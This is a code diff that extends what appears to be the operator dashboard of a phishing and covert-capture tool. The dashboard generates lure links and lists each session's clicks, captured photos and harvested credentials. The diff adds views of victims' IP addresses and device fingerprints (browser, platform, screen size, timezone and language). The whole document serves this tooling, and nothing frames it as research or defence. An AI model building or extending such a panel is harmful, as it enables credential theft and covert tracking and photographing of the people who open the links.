@@ -64,6 +64,9 @@
         .stat-card .number.credentials {
             color: #f472b6;
         }
+        .stat-card .number.ips {
+            color: #60a5fa;
+        }
         .btn-primary {
             background: linear-gradient(90deg, #c084fc, #ec4899);
             border: none;
@@ -144,6 +147,10 @@
             font-size: 12px;
             color: rgba(255,255,255,0.4);
         }
+        .session-details .ip-info {
+            color: #60a5fa;
+            font-family: 'Courier New', monospace;
+        }
         .link-box {
             background: rgba(255,255,255,0.05);
             padding: 15px;
@@ -190,6 +197,13 @@
         .view-btn.credentials-btn:hover {
             background: rgba(244,114,182,0.2);
         }
+        .view-btn.ips-btn {
+            border-color: rgba(96,165,250,0.3);
+            color: #60a5fa;
+        }
+        .view-btn.ips-btn:hover {
+            background: rgba(96,165,250,0.2);
+        }
         .no-sessions {
             color: rgba(255,255,255,0.3);
             text-align: center;
@@ -231,6 +245,10 @@
             <div class="number credentials" id="totalCredentials">0</div>
             <div class="label">🔐 Credentials</div>
         </div>
+        <div class="stat-card">
+            <div class="number ips" id="totalIPs">0</div>
+            <div class="label">🌐 IPs Tracked</div>
+        </div>
     </div>
     
     <div class="btn-group">
@@ -255,7 +273,7 @@
     <script>
         let currentLink = '';
 
-        // View photos for a session
+        // View photos
         async function viewPhotos(sessionId) {
             try {
                 const res = await fetch(`/api/photos/${sessionId}`);
@@ -343,7 +361,7 @@
             }
         }
 
-        // View credentials for a session
+        // View credentials
         async function viewCredentials(sessionId) {
             try {
                 const res = await fetch(`/api/credentials/${sessionId}`);
@@ -412,10 +430,6 @@
                                 .back-btn:hover {
                                     background: rgba(255,255,255,0.2);
                                 }
-                                .no-data {
-                                    color: rgba(255,255,255,0.3);
-                                    text-align: center;
-                                }
                             </style>
                         </head>
                         <body>
@@ -428,7 +442,7 @@
                                     <span class="time">${new Date(c.timestamp).toLocaleString()}</span>
                                 </div>
                             `).join('')}
-                            ${data.credentials.length === 0 ? '<p class="no-data">No credentials captured</p>' : ''}
+                            ${data.credentials.length === 0 ? '<p style="color:rgba(255,255,255,0.3);">No credentials</p>' : ''}
                         </body>
                         </html>
                     `);
@@ -441,7 +455,125 @@
             }
         }
 
-        // Fetch dashboard data
+        // View IPs
+        async function viewIPs(sessionId) {
+            try {
+                const res = await fetch(`/api/ips/${sessionId}`);
+                const data = await res.json();
+                
+                const win = window.open('', '_blank');
+                win.document.write(`
+                    <html>
+                    <head>
+                        <title>🌐 IP Tracker</title>
+                        <style>
+                            body { 
+                                font-family: 'Segoe UI', sans-serif; 
+                                background: #0a0a1a; 
+                                color: #fff; 
+                                padding: 20px; 
+                                display: flex;
+                                flex-direction: column;
+                                align-items: center;
+                                gap: 16px;
+                            }
+                            .ip-card {
+                                background: rgba(255,255,255,0.05);
+                                border-radius: 16px;
+                                padding: 20px 24px;
+                                border: 1px solid rgba(96,165,250,0.2);
+                                width: 100%;
+                                max-width: 500px;
+                            }
+                            .ip-card .ip {
+                                color: #60a5fa;
+                                font-family: 'Courier New', monospace;
+                                font-size: 18px;
+                                font-weight: 700;
+                            }
+                            .ip-card .time {
+                                font-size: 11px;
+                                color: rgba(255,255,255,0.3);
+                                margin-top: 4px;
+                            }
+                            .device-card {
+                                background: rgba(255,255,255,0.03);
+                                border-radius: 12px;
+                                padding: 16px 20px;
+                                border: 1px solid rgba(255,255,255,0.05);
+                                width: 100%;
+                                max-width: 500px;
+                            }
+                            .device-card .label {
+                                color: rgba(255,255,255,0.4);
+                                font-size: 11px;
+                            }
+                            .device-card .value {
+                                color: #c084fc;
+                                font-size: 13px;
+                            }
+                            h1 {
+                                background: linear-gradient(90deg, #c084fc, #ec4899);
+                                -webkit-background-clip: text;
+                                -webkit-text-fill-color: transparent;
+                                text-align: center;
+                            }
+                            .back-btn {
+                                background: rgba(255,255,255,0.1);
+                                border: none;
+                                color: #fff;
+                                padding: 10px 24px;
+                                border-radius: 10px;
+                                cursor: pointer;
+                                font-size: 14px;
+                                width: 100%;
+                                max-width: 500px;
+                            }
+                            .back-btn:hover {
+                                background: rgba(255,255,255,0.2);
+                            }
+                            .section-title {
+                                color: rgba(255,255,255,0.5);
+                                font-size: 14px;
+                                margin-top: 10px;
+                                width: 100%;
+                                max-width: 500px;
+                            }
+                        </style>
+                    </head>
+                    <body>
+                        <button class="back-btn" onclick="window.close()">⬅ Close</button>
+                        <h1>🌐 IP Tracker & Device Fingerprint</h1>
+                        
+                        <div class="section-title">📡 IP Addresses (${data.ips ? data.ips.length : 0})</div>
+                        ${data.ips && data.ips.length > 0 ? data.ips.map(ip => `
+                            <div class="ip-card">
+                                <div class="ip">${ip.ip}</div>
+                                <div class="time">${new Date(ip.timestamp).toLocaleString()}</div>
+                            </div>
+                        `).join('') : '<p style="color:rgba(255,255,255,0.3);">No IPs tracked</p>'}
+
+                        <div class="section-title">🖥️ Device Fingerprint</div>
+                        ${data.devices && data.devices.length > 0 ? data.devices.map(d => `
+                            <div class="device-card">
+                                <div><span class="label">Browser:</span> <span class="value">${d.userAgent || 'N/A'}</span></div>
+                                <div><span class="label">Platform:</span> <span class="value">${d.platform || 'N/A'}</span></div>
+                                <div><span class="label">Screen:</span> <span class="value">${d.screenWidth || '?'}x${d.screenHeight || '?'}</span></div>
+                                <div><span class="label">Timezone:</span> <span class="value">${d.timezone || 'N/A'}</span></div>
+                                <div><span class="label">Language:</span> <span class="value">${d.language || 'N/A'}</span></div>
+                                <div style="font-size:10px;color:rgba(255,255,255,0.2);margin-top:4px;">${new Date(d.timestamp).toLocaleString()}</div>
+                            </div>
+                        `).join('') : '<p style="color:rgba(255,255,255,0.3);">No device info</p>'}
+                    </body>
+                    </html>
+                `);
+                win.document.close();
+            } catch (err) {
+                alert('Failed to load IPs: ' + err.message);
+            }
+        }
+
+        // Fetch dashboard
         async function fetchDashboard() {
             try {
                 const res = await fetch('/api/dashboard');
@@ -452,6 +584,7 @@
                 document.getElementById('activeSessions').textContent = sessions.filter(s => s.status === 'ACTIVE').length;
                 document.getElementById('totalPhotos').textContent = sessions.reduce((sum, s) => sum + (s.photos || 0), 0);
                 document.getElementById('totalCredentials').textContent = sessions.reduce((sum, s) => sum + (s.credentials || 0), 0);
+                document.getElementById('totalIPs').textContent = sessions.reduce((sum, s) => sum + (s.ips || 0), 0);
                 
                 const list = document.getElementById('sessionsList');
                 if (sessions.length === 0) {
@@ -463,12 +596,17 @@
                     <div class="session-item ${s.status === 'ACTIVE' ? 'active' : ''}">
                         <div class="session-info">
                             <div class="session-id">${s.id}</div>
-                            <div class="session-details">Clicks: ${s.clicks} · Photos: ${s.photos} · Credentials: ${s.credentials || 0} · Created: ${new Date(s.created).toLocaleString()}</div>
+                            <div class="session-details">
+                                Clicks: ${s.clicks} · Photos: ${s.photos} · Credentials: ${s.credentials || 0} · 
+                                IPs: ${s.ips || 0} · Created: ${new Date(s.created).toLocaleString()}
+                                ${s.lastIp && s.lastIp !== 'N/A' ? `<span class="ip-info"> · Last IP: ${s.lastIp}</span>` : ''}
+                            </div>
                         </div>
                         <div class="session-actions">
                             <span class="session-status ${s.status === 'ACTIVE' ? 'status-active' : 'status-waiting'}">${s.status}</span>
                             ${s.photos > 0 ? `<button class="view-btn" onclick="viewPhotos('${s.id}')">📸 Photos</button>` : ''}
                             ${s.credentials > 0 ? `<button class="view-btn credentials-btn" onclick="viewCredentials('${s.id}')">🔐 Creds</button>` : ''}
+                            ${s.ips > 0 ? `<button class="view-btn ips-btn" onclick="viewIPs('${s.id}')">🌐 IP</button>` : ''}
                         </div>
                     </div>
                 `).join('');
@@ -478,7 +616,7 @@
             }
         }
 
-        // Generate new link
+        // Generate link
         document.getElementById('generateBtn').addEventListener('click', async () => {
             try {
                 const res = await fetch('/api/generate', { method: 'POST' });
@@ -494,14 +632,11 @@
             }
         });
 
-        // Copy link
         function copyLink() {
             if (navigator.clipboard) {
                 navigator.clipboard.writeText(currentLink).then(() => {
                     alert('✅ Link copied to clipboard!');
-                }).catch(() => {
-                    fallbackCopy();
-                });
+                }).catch(() => fallbackCopy());
             } else {
                 fallbackCopy();
             }
@@ -517,10 +652,8 @@
             alert('✅ Link copied!');
         }
 
-        // Refresh
         document.getElementById('refreshBtn').addEventListener('click', fetchDashboard);
 
-        // Auto-refresh every 10 seconds
         fetchDashboard();
         setInterval(fetchDashboard, 10000);
     </script>
